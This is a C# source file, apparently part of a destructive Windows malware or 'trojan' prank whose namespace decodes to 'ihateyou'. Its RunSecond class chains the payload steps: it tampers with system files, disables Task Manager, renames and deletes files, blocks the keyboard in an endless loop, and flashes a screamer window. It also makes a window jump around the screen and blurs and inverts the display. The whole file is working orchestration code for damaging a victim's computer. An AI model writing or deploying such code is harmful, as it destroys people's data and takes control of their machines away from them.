using _6968617465796f750d0a.Interface;
using System;
using System.Diagnostics;
using System.Reflection.Metadata;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Interop;

namespace _6968617465796f750d0a.Services
{

    internal class RunSecond
    {

        private TaskManager.Blackouts taskmnr = new TaskManager.Blackouts();
        private TaskManager.Rename rename = new TaskManager.Rename();
        private Win32.Funnys funnys = new Win32.Funnys();
        private FileManager.Deleter delete = new FileManager.Deleter();
        private FileManager.SystemFiles sysfiles = new FileManager.SystemFiles();
        private Keyboard.BlockTyping blockkeyboard = new Keyboard.BlockTyping();

        public async void Execute(Window win)
        {

            sysfiles.Execute();
            taskmnr.runTask();
            rename.RenameAll();
            changeKeybState();

            delete.Execute();
            delete.RenameExecute();
            Screamers();
            movingWindow(win);

            funnys.BlurEffect();
            await Task.Delay(10000);
            funnys.InvertColors();

        }

        private async void changeKeybState()
        {

            while (true)
            {
                await Task.Delay(1000);
                blockkeyboard.stateChange(true);
            }

        }

        private void Screamers()
        {
            Screamer sc = new Screamer(0);
            sc.Show();
        }

        [DllImport("user32.dll", EntryPoint = "SetWindowPos")]
        public static extern IntPtr SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int x, int Y, int cx, int cy, int wFlags);

        const short SWP_NOMOVE = 0X2;
        const short SWP_NOSIZE = 1;
        const short SWP_NOZORDER = 0X4;
        const int SWP_SHOWWINDOW = 0x0040;

        private async void movingWindow(Window win)
        {

            while (true)
            {

                IntPtr Handle = new WindowInteropHelper(win).Handle;
                if (Handle != IntPtr.Zero)
                {
                    try { SetWindowPos(Handle, 0, new Random().Next(Convert.ToInt32(SystemParameters.PrimaryScreenWidth) - 200), new Random().Next(Convert.ToInt32(SystemParameters.PrimaryScreenHeight) - 200), 0, 0, SWP_NOZORDER | SWP_NOSIZE | SWP_SHOWWINDOW); } catch { }
                }
                await Task.Delay(500);

            }

        }

    }
}
